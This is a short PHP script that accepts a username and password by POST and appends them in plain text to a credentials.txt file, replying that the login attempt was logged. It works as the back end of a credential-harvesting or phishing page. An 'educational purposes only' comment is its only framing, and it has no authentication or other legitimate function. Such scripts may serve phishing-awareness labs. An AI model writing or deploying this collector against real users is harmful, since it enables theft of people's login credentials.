<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Capture the credentials from the POST request
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Log the credentials (for educational purposes only, do not log plain text passwords in real applications)
    $log_entry = "Username: $username, Password: $password" . PHP_EOL;
    file_put_contents('credentials.txt', $log_entry, FILE_APPEND);
    
    // Display a simple response
    echo "Login attempt logged successfully";
} else {
    echo "Method not allowed";
}
?>
